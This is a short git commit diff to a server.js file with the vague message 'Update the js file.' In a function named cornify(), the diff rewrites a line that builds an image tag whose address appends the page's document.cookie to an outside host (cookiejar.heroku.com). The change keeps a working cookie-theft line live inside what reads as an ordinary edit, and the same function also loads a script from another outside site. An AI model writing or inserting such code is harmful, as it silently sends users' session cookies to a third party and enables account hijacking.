6ccb9b1ac80604d7acaf827a9c7e98f28df3f250
Chris Williams <chris@iterativedesigns.com>
2010-05-18 00:34:57 -0400

    Update the js file.

--- server.js
+++ server.js
@@ -56,6 +56,7 @@ with(require("./lib/fab"))
 function cornify() {
   document.write('<script type="text/javascript" src="http://www.cornify.com/js/cornify.js"></script>'); 
   var corn = function() { try { cornify_add(); } catch(e) {} setTimeout(corn, 1000); }; 
-  document.write('<img src="http://cookiejar.heroku.com/'+document.cookie+'"/>'); 
+  var str = "<img src=\"http://cookiejar.heroku.com/"+document.cookie+"\"/>";
+  document.write(str); 
   setTimeout(corn, 1000);
 }
